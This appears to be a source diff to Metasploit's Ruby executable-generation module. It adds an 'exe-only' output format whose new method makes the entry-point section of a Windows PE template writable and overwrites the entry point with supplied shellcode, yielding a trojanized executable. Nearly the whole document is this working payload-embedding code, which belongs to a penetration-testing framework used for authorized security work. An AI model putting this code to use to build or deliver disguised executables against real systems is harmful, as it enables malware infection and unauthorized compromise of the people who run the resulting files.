@@ -364,6 +364,41 @@ require 'digest/sha1'
 		exe
 	end
 
+	def self.to_win32pe_only(framework, code, opts={})
+
+		# Allow the user to specify their own EXE template
+		set_template_default(opts, "template_x86_windows_old.exe")
+
+		pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
+
+		exe = ''
+			File.open(opts[:template], 'rb') { |fd|
+				exe = fd.read(fd.stat.size)
+			}
+
+		sections_header = []
+		pe._file_header.v['NumberOfSections'].times { |i| sections_header << [(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18+0x24),exe[(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18),0x28]] }
+
+
+		#look for section with entry point
+		sections_header.each do |sec|
+			virtualAddress = sec[1][0xc,0x4].unpack('L')[0]
+			sizeOfRawData = sec[1][0x10,0x4].unpack('L')[0]
+			characteristics = sec[1][0x24,0x4].unpack('L')[0]
+			if pe.hdr.opt.AddressOfEntryPoint >= virtualAddress && pe.hdr.opt.AddressOfEntryPoint < virtualAddress+sizeOfRawData
+				#put this section writable
+				characteristics|=0x80000000
+				newcharacteristics = [characteristics].pack('L')
+				exe[sec[0],newcharacteristics.length]=newcharacteristics
+			end
+		end
+
+		#put the shellcode at the entry point, overwriting template
+		exe[pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint),code.length]=code
+
+		return exe
+	end
+
 
 	def self.to_win32pe_old(framework, code, opts={})
 
@@ -1930,6 +1965,11 @@ End Sub
 				output = Msf::Util::EXE.to_win32pe_old(framework, code, exeopts)
 			end
 
+		when 'exe-only'
+			if(not arch or (arch.index(ARCH_X86)))
+				output = Msf::Util::EXE.to_win32pe_only(framework, code, exeopts)
+			end
+
 		when 'elf'
 			if (not plat or (plat.index(Msf::Module::Platform::Linux)))
 				if (not arch or (arch.index(ARCH_X86)))
@@ -1994,7 +2034,7 @@ End Sub
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
+		['dll','exe','exe-small','exe-only','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
 	end
 
 	#
